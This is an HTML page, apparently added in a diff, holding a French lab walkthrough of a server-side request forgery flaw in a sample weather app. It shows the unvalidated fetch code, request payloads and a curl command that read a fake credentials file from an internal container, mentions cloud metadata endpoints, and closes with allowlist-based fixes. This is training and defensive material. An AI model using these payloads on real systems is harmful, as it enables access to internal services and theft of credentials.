@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 7 Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #11161d;
+      --text: #e5e7eb;
+      --muted: #a3acb9;
+      --line: #222a35;
+      --accent: #f59e0b;
+      --code-bg: #0f141b;
+      --code-text: #dbe4ee;
+      --kw: #c792ea;
+      --fn: #82aaff;
+      --str: #c3e88d;
+      --tag: #f78c6c;
+      --attr: #ffcb6b;
+      --var: #b0bec5;
+      --comment: #6b7280;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: Arial, Helvetica, sans-serif; padding: 32px 16px 48px; }
+    .page { max-width: 820px; margin: 0 auto; }
+    .article { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 32px; }
+    .eyebrow { font-size: 0.78rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--accent); margin-bottom: 14px; }
+    h1 { font-size: 2.2rem; line-height: 1.1; margin-bottom: 16px; font-weight: 700; }
+    .lead { font-size: 1rem; line-height: 1.7; color: var(--muted); margin-bottom: 32px; }
+    section + section { margin-top: 36px; padding-top: 28px; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.35rem; margin-bottom: 14px; }
+    h3 { font-size: 0.98rem; margin: 22px 0 10px; color: var(--text); }
+    p { font-size: 0.98rem; line-height: 1.7; color: var(--muted); margin-bottom: 14px; }
+    pre { margin: 14px 0 18px; padding: 16px 18px; overflow-x: auto; background: var(--code-bg); color: var(--code-text); border: 1px solid var(--line); border-radius: 8px; font: 0.94rem/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    code.inline { font: 0.92em ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: #1b2330; color: var(--accent); padding: 2px 6px; border-radius: 6px; }
+    .callout { padding: 16px 18px; border-left: 4px solid var(--accent); background: #0f141b; margin: 14px 0 18px; color: var(--muted); }
+    .kw { color: var(--kw); } .fn { color: var(--fn); } .str { color: var(--str); } .tag { color: var(--tag); } .attr { color: var(--attr); } .var { color: var(--var); } .comment { color: var(--comment); }
+    strong { color: var(--text); }
+    @media (max-width: 820px) { body { padding: 20px 12px 40px; } .article { padding: 24px 20px; } h1 { font-size: 2rem; } }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <article class="article">
+      <div class="eyebrow">Jour 4 / Lab 7</div>
+      <h1>SSRF via une URL d’API fournie par le client</h1>
+      <p class="lead">WeatherCheck ressemble à une simple app météo. On choisit une ville et le serveur va chercher une API météo. Mais l’<em>URL complète</em> de l’API est construite côté navigateur et envoyée dans le corps de la requête, donc le serveur ira chercher n’importe quelle URL fournie par le client — y compris des services internes.</p>
+
+      <section>
+        <h2>Rappel rapide sur le SSRF</h2>
+        <p><strong>SSRF</strong> (Server-Side Request Forgery) apparaît quand une application va chercher une URL contrôlée par l’attaquant, depuis sa propre position réseau. Le serveur devient un proxy qui peut atteindre des choses que l’attaquant ne peut pas : services internes, endpoints de métadonnées, interfaces d’admin, bases de données, ou outils accessibles uniquement en localhost.</p>
+        <p>L’impact dépend de ce qui vit sur le réseau interne. En cloud, la première cible est habituellement le service de métadonnées de l’instance (<code class="inline">169.254.169.254</code>). Dans un lab containerisé, c’est les services internes sur le même réseau Docker.</p>
+      </section>
+
+      <section>
+        <h2>D’où vient la vulnérabilité</h2>
+        <p>Chaque carte de ville rend un formulaire qui transporte l’URL d’API complète dans un input caché.</p>
+        <pre><span class="tag">&lt;form</span> <span class="attr">method</span>=<span class="str">"post"</span> <span class="attr">action</span>=<span class="str">"/check"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"city"</span>    <span class="attr">value</span>=<span class="str">"Paris"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"api_url"</span> <span class="attr">value</span>=<span class="str">"https://wttr.in/Paris?format=j1"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;button&gt;</span>Get Weather<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;/form&gt;</span></pre>
+
+        <p>Le backend prend cette URL et la fetch directement, sans aucune validation :</p>
+        <pre><span class="kw">def</span> <span class="fn">check</span>():
+    <span class="var">api_url</span> = request.form.get(<span class="str">'api_url'</span>, <span class="str">''</span>).strip()
+    <span class="var">city</span>    = request.form.get(<span class="str">'city'</span>, <span class="str">'Unknown'</span>)
+
+    <span class="var">response</span> = http_requests.get(api_url, timeout=<span class="str">5</span>)
+    <span class="kw">return</span> render_template(<span class="str">'result.html'</span>,
+                           <span class="var">city</span>=city,
+                           <span class="var">api_url</span>=api_url,
+                           <span class="var">body</span>=response.text[:<span class="str">8000</span>])</pre>
+
+        <div class="callout">
+          <p>Le serveur renvoie le corps de la réponse directement dans la page, ce qui en fait un SSRF <em>in-band</em> de manuel — on voit exactement ce que le serveur a récupéré.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>Cartographier le réseau interne</h2>
+        <p>Le fichier docker-compose définit un deuxième service sur le même réseau backend :</p>
+        <pre><span class="kw">services</span>:
+  <span class="var">web</span>:
+    <span class="kw">ports</span>:
+      - <span class="str">"5008:5008"</span>
+
+  <span class="var">files</span>:
+    <span class="kw">command</span>: [<span class="str">"python"</span>, <span class="str">"-m"</span>, <span class="str">"http.server"</span>, <span class="str">"7777"</span>, ...]
+    <span class="kw">expose</span>:
+      - <span class="str">"7777"</span>   <span class="comment"># accessible uniquement depuis le réseau docker</span></pre>
+
+        <p>Le service files utilise <code class="inline">expose</code>, pas <code class="inline">ports</code>, donc le port <code class="inline">7777</code> n’est accessible que depuis les autres conteneurs du réseau — pas depuis le laptop. C’est cette asymétrie que SSRF exploite.</p>
+      </section>
+
+      <section>
+        <h2>Comment fonctionne l’exploit</h2>
+        <p>On intercepte la requête météo (Burp, ZAP, ou « Edit and resend » dans les devtools de Firefox) et on change <code class="inline">api_url</code> pour pointer vers le service interne.</p>
+
+        <h3>Lister les fichiers internes</h3>
+        <pre>POST /check
+city=Paris&amp;api_url=http://files:7777/</pre>
+
+        <p>La réponse contient le listing du dossier <code class="inline">/srv/files</code> : <code class="inline">credentials.txt</code>, <code class="inline">backup-config.json</code>, <code class="inline">employee-list.csv</code>, <code class="inline">internal-notes.md</code>.</p>
+
+        <h3>Lire les credentials</h3>
+        <pre>POST /check
+city=Paris&amp;api_url=http://files:7777/credentials.txt</pre>
+
+        <p>Même technique, autre chemin. La page de réponse affiche maintenant le fichier complet de credentials avec des faux secrets DB, SSH, AWS et Redis — des données qu’on ne pourrait jamais atteindre depuis l’internet public.</p>
+
+        <h3>Avec curl</h3>
+        <pre>curl -s -X POST http://localhost:5008/check \
+  --data-urlencode <span class="str">"city=Paris"</span> \
+  --data-urlencode <span class="str">"api_url=http://files:7777/credentials.txt"</span></pre>
+
+        <div class="callout">
+          <p>Dans un vrai environnement cloud, le même pattern atteint les endpoints de métadonnées (<code class="inline">http://169.254.169.254/latest/meta-data/</code>), des panels d’admin internes, des Elasticsearch ou Redis non authentifiés, et autres services qui font confiance au périmètre réseau.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>Correctif</h2>
+        <p>Ne pas accepter une URL complète depuis le client. Laisser l’utilisateur choisir un nom de ville et construire l’URL côté serveur.</p>
+        <pre><span class="var">CITIES</span> = {<span class="str">'Paris'</span>, <span class="str">'Tokyo'</span>, <span class="str">'New York'</span>, ...}
+
+<span class="kw">def</span> <span class="fn">check</span>():
+    <span class="var">city</span> = request.form.get(<span class="str">'city'</span>, <span class="str">''</span>)
+    <span class="kw">if</span> city <span class="kw">not in</span> CITIES:
+        <span class="kw">return</span> <span class="str">'Unknown city'</span>, <span class="str">400</span>
+
+    <span class="var">url</span> = <span class="str">f"https://wttr.in/{city}?format=j1"</span>
+    <span class="var">response</span> = http_requests.get(url, timeout=<span class="str">5</span>)
+    <span class="comment"># ...</span></pre>
+
+        <p>Si pour une raison quelconque l’app doit vraiment accepter une URL, valider <em>après</em> la résolution DNS et avant la requête HTTP :</p>
+        <ul style="margin: 0 0 14px 18px; color: var(--muted); line-height: 1.7;">
+          <li>Allowlist d’hôtes, pas de denylist. <code class="inline">wttr.in</code> seulement, tout le reste rejeté.</li>
+          <li>Forcer le schéma à <code class="inline">https</code>.</li>
+          <li>Résoudre le nom d’hôte et rejeter les plages RFC1918, <code class="inline">127.0.0.0/8</code>, <code class="inline">169.254.0.0/16</code>, et leurs équivalents IPv6 (<code class="inline">::1</code>, <code class="inline">fc00::/7</code>).</li>
+          <li>Désactiver les redirections, ou re-valider chaque saut. Sinon une URL publique peut rediriger vers <code class="inline">http://169.254.169.254/</code> et contourner le contrôle d’IP.</li>
+          <li>Faire passer la requête sortante par une politique réseau qui ne peut tout simplement pas atteindre les services internes.</li>
+        </ul>
+        <p>L’allowlist de la destination est presque toujours la bonne réponse. La seule validation d’URL est très difficile à bien faire.</p>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
